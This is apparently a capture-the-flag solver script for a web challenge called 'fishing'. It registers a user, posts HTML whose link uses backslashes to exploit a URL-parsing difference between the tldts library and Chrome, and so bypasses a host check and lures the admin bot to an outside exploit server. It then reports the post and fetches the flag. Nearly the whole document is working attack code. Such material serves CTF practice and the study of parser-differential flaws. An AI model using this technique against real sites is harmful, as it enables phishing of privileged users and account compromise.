# This is the submitter script.
# Its only purpose is to create the user, the post with the exploit and send everything to the admin.
import requests
import random
import string
import time

CHALLENGE_URL = "http://challs.polygl0ts.ch:12008"
REPORT_URL = "http://challs.polygl0ts.ch:12009"

# This URL resolves to where the backend of our exploit relies.
EXPLOIT_URL_TWO = "http://fishingsolveremotetwo.6b.vc"

# Step 1. Create the user and perform the login.

def randomString(stringLength=16):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

s = requests.Session()
username = randomString()
x = s.post(f"{CHALLENGE_URL}/register",json={"username":username})
password = x.json()["password"]

print(f"Username: {username} Password: {password}")

s.post(f"{CHALLENGE_URL}/login",json={"username":username, "password":password})

# Step 2. Create the post with the exploit.
#
# The exploit is subtle. We inject an anchor tag which will be clicked by the admin because it contains [Login to view this content].
# We need to bypass the host check.
# The host check is performed in this way:
#
# const { parse } = require('tldts');
# if (parse(a.href).hostname !== parse(req.headers.host).hostname && !isAuth) {
#   a.text = "[Login to view this content]"
#   a.href = "/login";
# }
#
# We need a way to trick the parser to think that we want the admin to click a safe link, but in reality is not.
# The way we can do it is by using the backslash char (\).
# Why? Because in javascript is treated as it is, while on chrome it gets converted to forward slash (/) when used in a link.
# This lead to a parser differential where the admin is phished to our domain.
#

data = {
    "title":"exploit",
    "content":f"""
        <a href='\\\\{EXPLOIT_URL_TWO.replace("http://","")}:9999\\x@fishing-web:3000/../'>[Login to view this content]</a>
    """
}

x = s.post(f"{CHALLENGE_URL}/posts",json=data)

postId = x.json()["postId"]

# Step 3. Submit the post to the admin.

requests.post(f"{REPORT_URL}/submit", data={"postId":postId})

print(postId)

requests.get(f"{EXPLOIT_URL_TWO}:9999/username?username={username}")

print("Username sent to exploit server")
print("Now waiting for the admin to do all the stuff, hopefully we flag")
time.sleep(20)
x = requests.get(f"{CHALLENGE_URL}/admin/flag")
print(x.text)



